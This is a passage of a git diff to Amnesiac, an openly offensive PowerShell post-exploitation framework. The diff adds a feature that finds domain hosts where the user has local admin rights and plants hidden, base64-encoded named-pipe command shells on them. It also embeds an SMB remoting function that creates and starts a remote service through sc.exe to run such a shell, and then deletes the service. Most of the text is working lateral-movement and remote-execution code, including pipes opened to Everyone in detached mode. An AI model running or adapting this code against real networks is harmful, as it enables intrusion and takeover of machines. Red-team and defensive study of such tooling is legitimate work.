@@ -73,6 +73,7 @@ function Amnesiac {
 	else{$global:MultiPipeName = "$GlobalPipeName"}
 	$global:bookmarks = New-Object 'System.Collections.Generic.List[psobject]'
 	$global:payloadformat = 'b64'
+	$global:localadminaccesspayload = 'SMB'
 	$global:AdminCheckProtocol = 'SMB'
 	$global:AllOurTargets = @()
 	$global:UserDefinedTargetsPath = $null
@@ -165,6 +166,18 @@ function Amnesiac {
 			elseif($global:payloadformat -eq 'raw'){
 				$global:payloadformat = 'b64'
 				$global:Message = " [+] Payload format: cmd(b64)"
+			}
+			continue
+		}
+		
+		if ($choice -eq 'Find-LocalAdminAccess') {
+			if($global:localadminaccesspayload -eq 'SMB'){
+				$global:localadminaccesspayload = 'PSRemoting'
+				$global:Message = " [+] Find-LocalAdminAccess Method: PSRemoting"
+			}
+			elseif($global:localadminaccesspayload -eq 'PSRemoting'){
+				$global:localadminaccesspayload = 'SMB'
+				$global:Message = " [+] Find-LocalAdminAccess Method: SMB"
 			}
 			continue
 		}
@@ -525,12 +538,12 @@ exit
 			$sessionNumber = [int]$commandParts[1]
 			
 			# Compute end indices for the various session categories
-			$directAdminEndIndex = 3 + $global:directAdminSessions.Count
+			$directAdminEndIndex = 4 + $global:directAdminSessions.Count
 			$listenerEndIndex = $directAdminEndIndex + $global:listenerSessions.Count
 			$globalListenerEndIndex = $listenerEndIndex + $global:MultipleSessions.Count
 			
-			if ($sessionNumber -ge 4 -and $sessionNumber -le $directAdminEndIndex) {
-				$selectedIndex = $sessionNumber - 4
+			if ($sessionNumber -ge 5 -and $sessionNumber -le $directAdminEndIndex) {
+				$selectedIndex = $sessionNumber - 5
 				$bookmark = [PSCustomObject]@{
 					'DisplayName' = " [$sessionNumber]"
 					'DisplayComputerName' = $global:directAdminSessions[$selectedIndex]
@@ -540,7 +553,7 @@ exit
 				$global:bookmarks.Add($bookmark)
 			}
 			elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
-				$selectedIndex = $sessionNumber - 4 - $global:directAdminSessions.Count
+				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count
 				$bookmark = [PSCustomObject]@{
 					'DisplayName' = " [$sessionNumber]"
 					'DisplayComputerName' = $global:listenerSessions[$selectedIndex].ComputerName
@@ -550,7 +563,7 @@ exit
 				$global:bookmarks.Add($bookmark)
 			}
 			elseif ($sessionNumber -gt $listenerEndIndex -and $sessionNumber -le $globalListenerEndIndex) {
-				$selectedIndex = $sessionNumber - 4 - $global:directAdminSessions.Count - $global:listenerSessions.Count
+				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
 				$bookmark = [PSCustomObject]@{
 					'DisplayName' = " [$sessionNumber]"
 					'DisplayComputerName' = $global:MultipleSessions[$selectedIndex].ComputerName
@@ -587,17 +600,17 @@ exit
 		if ($commandParts[0] -eq 'kill' -and $commandParts[1] -match '^\d+$') {
 			$sessionNumber = [int]$commandParts[1]
 			
-			$directAdminEndIndex = 3 + $global:directAdminSessions.Count
+			$directAdminEndIndex = 4 + $global:directAdminSessions.Count
 			$listenerEndIndex = $directAdminEndIndex + $global:listenerSessions.Count
 			
-			if ($sessionNumber -ge 4 -and $sessionNumber -le $directAdminEndIndex) {
-				$selectedIndex = $sessionNumber - 4
+			if ($sessionNumber -ge 5 -and $sessionNumber -le $directAdminEndIndex) {
+				$selectedIndex = $sessionNumber - 5
 				$selectedTarget = $global:directAdminSessions[$selectedIndex]
 				$global:Message = " [-] Killing Admin sessions is not needed, they are not active"
 				
 			}
 			elseif ($sessionNumber -gt $directAdminEndIndex -and $sessionNumber -le $listenerEndIndex) {
-				$selectedIndex = $sessionNumber - 4 - $global:directAdminSessions.Count
+				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count
 				$selectedSession = $global:listenerSessions[$selectedIndex]
 				
 				# Extract the unique identifier
@@ -620,7 +633,7 @@ exit
 					$global:listenerSessions.RemoveAt($indexToRemove)
 
 					# Calculate the desiredIndex for the removed session
-					$desiredIndex = "[{0}]" -f ($indexToRemove + 4 + $global:directAdminSessions.Count) # Adjust for base numbering and other sessions' count
+					$desiredIndex = "[{0}]" -f ($indexToRemove + 5 + $global:directAdminSessions.Count) # Adjust for base numbering and other sessions' count
 					$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }
 					if ($bookmarkToRemove) {
 						$global:bookmarks.Remove($bookmarkToRemove) > $null
@@ -630,7 +643,7 @@ exit
 				}
 			}
 			elseif ($sessionNumber -gt $listenerEndIndex) {
-				$selectedIndex = $sessionNumber - 4 - $global:directAdminSessions.Count - $global:listenerSessions.Count
+				$selectedIndex = $sessionNumber - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
 				$selectedMultiSession  = $global:MultipleSessions[$selectedIndex]
 				
 				# Extract the unique identifier
@@ -653,7 +666,7 @@ exit
 					$global:MultipleSessions.RemoveAt($indexToRemove)
 					
 					# Calculate the desiredIndex for the removed session
-					$desiredIndex = "[{0}]" -f ($indexToRemove + 4 + $global:directAdminSessions.Count + $global:listenerSessions.Count) # Adjust for base numbering and other sessions' count
+					$desiredIndex = "[{0}]" -f ($indexToRemove + 5 + $global:directAdminSessions.Count + $global:listenerSessions.Count) # Adjust for base numbering and other sessions' count
 					$bookmarkToRemove = $global:bookmarks | Where-Object { $_.DisplayName -like "*$desiredIndex*" }
 					if ($bookmarkToRemove) {
 						$global:bookmarks.Remove($bookmarkToRemove) > $null
@@ -781,19 +794,92 @@ exit
 				if($global:RestoreAllUserDefinedTargets -eq $True){$global:AllUserDefinedTargets = $global:OldTargetsToRestore;$global:RestoreAllUserDefinedTargets = $False}
 				if($global:RestoreOldMultiPipeName -eq $True){$global:MultiPipeName = $global:OldPipeNameToRestore;$global:RestoreOldMultiPipeName = $False}
 			}
+			'4' {
+				$LocalAdminAccessOutput = $null
+				$global:OldPipeNameToRestore = $global:MultiPipeName
+				$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
+				
+				$PN = $global:MultiPipeName
+				$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+				
+				if($global:localadminaccesspayload -eq 'PSRemoting'){
+					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			
+					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
+					
+					$finalstring =  "powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
+					
+					$LocalAdminAccessOutput = Find-LocalAdminAccess -Method PSRemoting -Command $finalstring -NoOutput
+				}
+				
+				elseif($global:localadminaccesspayload -eq 'SMB'){					
+					if($global:Detach){$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+					else{$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"}
+			
+					$b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
+					
+					$finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
+					
+					$finalstring = $finalstring -replace '"', "'"
+					
+					$LocalAdminAccessOutput = Find-LocalAdminAccess -Method SMB -Command $finalstring -NoOutput
+				}
+				
+				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
+				$LocalAdminAccessOutput = ($LocalAdminAccessOutput | Out-String) -split "`n"
+				$LocalAdminAccessOutput = $LocalAdminAccessOutput.Trim()
+				$LocalAdminAccessOutput = $LocalAdminAccessOutput | Where-Object { $_ -ne "" }
+				
+				$adminLines = $LocalAdminAccessOutput | Where-Object { $_ -match "has Local Admin access on" }
+				$noAccessLines = $LocalAdminAccessOutput | Where-Object { $_ -match "No Access" }
+				
+				if($adminLines.Count -eq 0){
+					# Failed to execute
+					$global:MultiPipeName = $global:OldPipeNameToRestore
+					$global:ScanModer = $False
+					$global:Message = " [-] Failed to execute"
+					continue
+				}
+				
+				elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -gt 0){
+					# No Admin Access
+					$global:MultiPipeName = $global:OldPipeNameToRestore
+					$global:ScanModer = $False
+					if($global:localadminaccesspayload -eq 'PSRemoting'){$global:Message = " [-] No Admin Access [PSRemoting]"}
+					elseif($global:localadminaccesspayload -eq 'SMB'){$global:Message = " [-] No Admin Access [SMB]"}
+					continue
+				}
+				
+				elseif($adminLines.Count -gt 0 -and $noAccessLines.Count -eq 0){
+					
+					$TempAdminAccessTargets = $LocalAdminAccessOutput | Where-Object { $_ -notmatch "has Local Admin access on" -AND $_ -notmatch "Command execution completed"}
+					
+					if($global:localadminaccesspayload -eq 'PSRemoting'){$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"}
+					elseif($global:localadminaccesspayload -eq 'SMB'){$global:Message = " [+] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]"}
+					
+					$global:ScanModer = $True
+					$global:RestoreOldMultiPipeName = $True
+					$global:OldTargetsToRestore = $global:AllUserDefinedTargets
+					$global:AllUserDefinedTargets = $TempAdminAccessTargets
+					$global:RestoreAllUserDefinedTargets = $True
+					Start-Sleep 1
+					continue
+				}
+			}
 			default {
 				# If choice is numeric and in the range of directAdminSessions indices
-				if ($choice -is [int] -and $choice -ge 4 -and $choice -lt ($global:directAdminSessions.Count + 4)) {
-					$selectedIndex = $choice - 4
+				if ($choice -is [int] -and $choice -ge 5 -and $choice -lt ($global:directAdminSessions.Count + 5)) {
+					$selectedIndex = $choice - 5
 					$selectedTarget = $global:directAdminSessions[$selectedIndex]
 					if($global:Detach){Detached-Interaction -Target $selectedTarget -TimeOut $Timeout}
 					else{Choose-And-Interact -Target $selectedTarget -TimeOut $Timeout}
-				} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + 4) -and $choice -lt ($global:directAdminSessions.Count + $global:listenerSessions.Count + 4)) {
-					$selectedIndex = $choice - 4 - $global:directAdminSessions.Count
+				} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + 5) -and $choice -lt ($global:directAdminSessions.Count + $global:listenerSessions.Count + 5)) {
+					$selectedIndex = $choice - 5 - $global:directAdminSessions.Count
 					$selectedSession = $global:listenerSessions[$selectedIndex]
 					InteractWithPipeSession -PipeServer $selectedSession.PipeServer -StreamWriter $selectedSession.StreamWriter -StreamReader $selectedSession.StreamReader -computerNameOnly $selectedSession.ComputerName -PipeName $selectedSession.PipeName
-				} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + $global:listenerSessions.Count + 4) -and $choice -lt ($global:directAdminSessions.Count + $global:listenerSessions.Count + $global:MultipleSessions.Count + 4)) {
-					$selectedIndex = $choice - 4 - $global:directAdminSessions.Count - $global:listenerSessions.Count
+				} elseif ($choice -is [int] -and $choice -ge ($global:directAdminSessions.Count + $global:listenerSessions.Count + 5) -and $choice -lt ($global:directAdminSessions.Count + $global:listenerSessions.Count + $global:MultipleSessions.Count + 5)) {
+					$selectedIndex = $choice - 5 - $global:directAdminSessions.Count - $global:listenerSessions.Count
 					$selectedMultiSession = $global:MultipleSessions[$selectedIndex]
 					InteractWithPipeSession -PipeClient $selectedMultiSession.PipeClient -StreamWriter $selectedMultiSession.StreamWriter -StreamReader $selectedMultiSession.StreamReader -computerNameOnly $selectedMultiSession.ComputerName -PipeName $selectedMultiSession.PipeName -UniquePipeID $selectedMultiSession.UniquePipeID
 				} else {
@@ -818,7 +904,7 @@ function Display-SessionMenu {
  #+#     #+# #+#       #+# #+#   #+#+# #+#       #+#    #+#    #+#     #+#     #+# #+#    #+# 
  ###     ### ###       ### ###    #### ########## ######## ########### ###     ###  ########  ')
 
-	$BannerLink = '                                           [Version: 1.0.1] https://github.com/Leo4j/Amnesiac'
+	$BannerLink = '                                           [Version: 1.0.2] https://github.com/Leo4j/Amnesiac'
 	
 	if($Night){
 		Write-Host $Banner -Foreground blue
@@ -837,6 +923,7 @@ function Display-SessionMenu {
 		Write-Output " bookmark <sess.numb.>    Bookmark selected session"
 		Write-Output " bookmarks                Hide/Display Bookmarks"
 		Write-Output " exit                     Quit Amnesiac"
+		Write-Output " Find-LocalAdminAccess    Switch between SMB and PSRemoting"
 		Write-Output " GLSet <string>           Set Global-Listener Pipe Name"
 		Write-Output " help                     Displays this list of commands"
 		Write-Output " kill <sess.numb.>        Kill selected session"
@@ -871,9 +958,10 @@ function Display-SessionMenu {
     Write-Output " [1] Single-Listener (single target)"
 	Write-Output " [2] Global-Listener (multiple targets)"
 	Write-Output " [3] Scan network for listening targets"
+	Write-Output " [4] Shell via Find-LocalAdminAccess"
 	
 	# Starting index
-    $index = 4
+    $index = 5
 	
 	#$global:MultipleSessions = [System.Collections.Generic.List[psobject]]$global:MultipleSessions
 	
@@ -3453,6 +3541,570 @@ function Invoke-WMIRemoting {
 	else{([wmiclass]"\\$ComputerName\ROOT\CIMV2:$ClassID").Delete()}
 }
 '@
+
+$SmbScript = @'
+function Invoke-SMBRemoting {
+	
+	<#
+
+	.SYNOPSIS
+	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
+	https://github.com/Leo4j/Invoke-SMBRemoting
+	
+	#>
+
+	param (
+		[string]$PipeName,
+		[string]$ComputerName,
+		[string]$ServiceName,
+		[string]$Command,
+		[string]$Timeout = "30000",
+		[switch]$Verbose
+	)
+	
+	$ErrorActionPreference = "SilentlyContinue"
+	$WarningPreference = "SilentlyContinue"
+	Set-Variable MaximumHistoryCount 32767
+	
+	if (-not $ComputerName) {
+		Write-Output " [-] Please specify a Target"
+		return
+	}
+	
+	if(!$PipeName){
+		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
+		$randomvalue = $randomvalue -join ""
+		$PipeName = $randomvalue
+	}
+	
+	if(!$ServiceName){
+		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
+		$randomvalue = $randomvalue -join ""
+		$ServiceName = "Service_" + $randomvalue
+	}
+	
+	$ServerScript = @"
+`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 4096, 4096, `$null)
+`$pipeServer.WaitForConnection()
+`$sr = New-Object System.IO.StreamReader(`$pipeServer)
+`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
+while (`$true) {
+	if (-not `$pipeServer.IsConnected) {
+		break
+	}
+	`$command = `$sr.ReadLine()
+	if (`$command -eq "exit") {break} 
+	else {
+		try{
+			`$result = Invoke-Expression `$command | Out-String
+			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
+		} catch {
+			`$errorMessage = `$_.Exception.Message
+			`$sw.WriteLine(`$errorMessage)
+		}
+		`$sw.WriteLine("###END###")
+		`$sw.Flush()
+	}
+}
+`$pipeServer.Disconnect()
+`$pipeServer.Dispose()
+"@
+	
+	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
+	
+	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
+	
+	$startarguments = "\\$ComputerName start $ServiceName"
+	
+	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
+	
+	Start-Sleep -Milliseconds 1000
+	
+	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
+	
+	if($Verbose){
+		Write-Output ""
+		Write-Output " [+] Pipe Name: $PipeName"
+		Write-Output ""
+		Write-Output " [+] Service Name: $ServiceName"
+		Write-Output ""
+		Write-Output " [+] Creating Service on Remote Target..."
+	}
+	#Write-Output ""
+	
+	# Get the current process ID
+	$currentPID = $PID
+	
+	# Embedded monitoring script
+	$monitoringScript = @"
+`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
+`$TargetServer = "$ComputerName"
+`$primaryScriptProcessId = $currentPID
+
+while (`$true) {
+	Start-Sleep -Seconds 5 # Check every 5 seconds
+
+	# Check if the primary script is still running using its Process ID
+	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }
+
+	if (-not `$process) {
+		# If the process is not running, delete the service
+		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
+		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
+		break # Exit the monitoring script
+	}
+}
+"@
+	
+	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
+	
+	# Execute the embedded monitoring script in a hidden window
+	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
+	
+	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
+	
+ 	try {
+		$pipeClient.Connect($Timeout)
+	} catch [System.TimeoutException] {
+		Write-Output "[$($ComputerName)]: Connection timed out"
+		Write-Output ""
+		return
+	} catch {
+		Write-Output "[$($ComputerName)]: An unexpected error occurred"
+		Write-Output ""
+		return
+	}
+
+	$sr = New-Object System.IO.StreamReader($pipeClient)
+	$sw = New-Object System.IO.StreamWriter($pipeClient)
+
+	$serverOutput = ""
+	
+	if ($Command) {
+		$fullCommand = "$Command 2>&1 | Out-String"
+		$sw.WriteLine($fullCommand)
+		$sw.Flush()
+		while ($true) {
+			$line = $sr.ReadLine()
+			if ($line -eq "###END###") {
+				Write-Output $serverOutput.Trim()
+				Write-Output ""
+				return
+			} else {
+				$serverOutput += "$line`n"
+			}
+		}
+	} 
+	
+	else {
+		while ($true) {
+			
+			# Fetch the actual remote prompt
+			$sw.WriteLine("prompt | Out-String")
+			$sw.Flush()
+			
+			$remotePath = ""
+			while ($true) {
+				$line = $sr.ReadLine()
+
+				if ($line -eq "###END###") {
+					# Remove any extraneous whitespace, newlines etc.
+					$remotePath = $remotePath.Trim()
+					break
+				} else {
+					$remotePath += "$line`n"
+				}
+			}
+			
+			$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1
+			$promptString = "[$computerNameOnly]: $remotePath "
+			Write-Host -NoNewline $promptString
+			$userCommand = Read-Host
+			
+			if ($userCommand -eq "exit") {
+				Write-Output ""
+					$sw.WriteLine("exit")
+				$sw.Flush()
+				break
+			}
+			
+			elseif($userCommand -ne ""){
+				$fullCommand = "$userCommand 2>&1 | Out-String"
+				$sw.WriteLine($fullCommand)
+				$sw.Flush()
+			}
+			
+			else{
+				continue
+			}
+			
+			#Write-Output ""
+
+			$serverOutput = ""
+			while ($true) {
+				$line = $sr.ReadLine()
+
+				if ($line -eq "###END###") {
+					Write-Output $serverOutput.Trim()
+					Write-Output ""
+					break
+				} else {
+					$serverOutput += "$line`n"
+				}
+			}
+		}
+	}
+
+	$stoparguments = "\\$ComputerName delete $ServiceName"
+	Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
+	$pipeClient.Close()
+	$pipeClient.Dispose()
+}
+'@
+
+function Find-LocalAdminAccess {
+	
+	<#
+
+	.SYNOPSIS
+	Find-LocalAdminAccess Author: Rob LP (@L3o4j)
+	https://github.com/Leo4j/Find-LocalAdminAccess
+
+	
+	#>
+	
+    	param (
+        	[string]$Targets,
+		[Parameter(Mandatory=$true)]
+        	[string]$Method,
+        	[string]$UserName,
+        	[string]$Password,
+		[string]$Command,
+  		[string]$Domain,
+    		[string]$DomainController,
+		[switch]$ShowErrors,
+		[switch]$scsafe,
+		[switch]$NoOutput,
+  		[switch]$SaveOutput,
+    		[switch]$InLine
+    	)
+	if(!$ShowErrors){
+		$ErrorActionPreference = "SilentlyContinue"
+		$WarningPreference = "SilentlyContinue"
+	}
+	
+	Set-Variable MaximumHistoryCount 32767
+
+    	if (($UserName -OR $Password) -AND ($Method -eq "SMB")) {
+        	Write-Output "Please use Method WMI or PSRemoting if you need to run as a different user"
+        	return
+    	}
+
+    	if ($Targets) {
+     		$TestPath = Test-Path $Targets
+		
+		if($TestPath){
+			$Computers = Get-Content -Path $Targets
+			$Computers = $Computers | Sort-Object -Unique
+		}
+		
+		else{
+			$Computers = $Targets
+			$Computers = $Computers -split ","
+			$Computers = $Computers | Sort-Object -Unique
+		}
+    	} else {
+		$Computers = @()
+        	$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
+			if($Domain){
+				if($DomainController){
+					$TempDomainName = "DC=" + $Domain.Split(".")
+					$domainDN = $TempDomainName -replace " ", ",DC="
+					$ldapPath = "LDAP://$DomainController/$domainDN"
+					$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
+				}
+				else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")}
+			}
+			else{$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry}
+        	$objSearcher.Filter = "(&(sAMAccountType=805306369)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+        	$objSearcher.PageSize = 1000
+        	$Computers = $objSearcher.FindAll() | ForEach-Object { $_.properties.dnshostname }
+		$Computers = $Computers | Sort-Object -Unique
+    	}
+
+    	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
+	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+	$TempHostname = $HostFQDN -replace '\..*', ''
+	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
+	$Computers = $Computers | Where-Object {$_ -ne "$TempHostname"}
+	
+	if($Method -eq "WMI"){$PortScan = 135}
+	elseif($Method -eq "SMB"){$PortScan = 445}
+	elseif($Method -eq "PSRemoting"){$PortScan = 5985}
+	
+	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
+	$runspacePool.Open()
+
+	$scriptBlock = {
+		param ($computer, $port)
+		$tcpClient = New-Object System.Net.Sockets.TcpClient
+		$asyncResult = $tcpClient.BeginConnect($computer, $port, $null, $null)
+		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
+		if ($wait) {
+			try {
+				$tcpClient.EndConnect($asyncResult)
+				return $computer
+			} catch {}
+		}
+		$tcpClient.Close()
+		return $null
+	}
+
+	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
+
+	foreach ($computer in $Computers) {
+		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer).AddArgument($PortScan)
+		$powerShellInstance.RunspacePool = $runspacePool
+		$runspaces.Add([PSCustomObject]@{
+			Instance = $powerShellInstance
+			Status   = $powerShellInstance.BeginInvoke()
+		})
+	}
+
+	$reachable_hosts = @()
+	foreach ($runspace in $runspaces) {
+		$result = $runspace.Instance.EndInvoke($runspace.Status)
+		if ($result) {
+			$reachable_hosts += $result
+		}
+	}
+
+	$Computers = $reachable_hosts
+	
+	#$Computers = $Computers | Sort-Object -Unique
+
+	$runspacePool.Close()
+	$runspacePool.Dispose()
+	
+	if($UserName){
+		Write-Output ""
+		Write-Output "[+] $UserName has Local Admin access on:"
+		Write-Output ""
+	}
+	else{
+		Write-Output ""
+		Write-Output "[+] The current user has Local Admin access on:"
+		Write-Output ""
+	}
+
+    	$ScriptBlock = {
+		param (
+			$Computer,
+			$Method,
+			$UserName,
+			$Password
+		)
+		
+		if($UserName -AND $Password){
+			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
+			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
+		}
+		
+		$Error.Clear()
+
+		if ($UserName -AND $Password -AND ($Method -eq "WMI")) {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
+  		elseif ($UserName -AND $Password -AND ($Method -eq "PSRemoting")) {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred}
+    		elseif ($Method -eq "WMI") {Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue}
+      		elseif ($Method -eq "PSRemoting") {Invoke-Command -ScriptBlock { hostname } -ComputerName $Computer -ErrorAction SilentlyContinue}
+		elseif ($Method -eq "SMB") {ls \\$Computer\c$ -ErrorAction SilentlyContinue}
+		if($error[0] -eq $null) {
+			return @{
+		    	Computer = $Computer
+		    	Success  = $true
+			}
+	    } else {
+			return @{
+		    	Computer = $Computer
+		    	Success  = $false
+		    	Message  = $error[0].ToString()
+			}
+	    }
+	}
+
+    	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
+    	$runspacePool.Open()
+    	$runspaces = New-Object System.Collections.ArrayList
+
+    	foreach ($Computer in $Computers) {
+        	$runspace = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Computer).AddArgument($Method).AddArgument($UserName).AddArgument($Password)
+        	$runspace.RunspacePool = $runspacePool
+        	$null = $runspaces.Add([PSCustomObject]@{
+            		Pipe = $runspace
+            		Status = $runspace.BeginInvoke()
+        	})
+    	}
+
+    	$ComputerAccess = @()
+		foreach ($run in $runspaces) {
+			try {
+				$result = $run.Pipe.EndInvoke($run.Status)
+			} catch {}
+			if ($result.Success) {
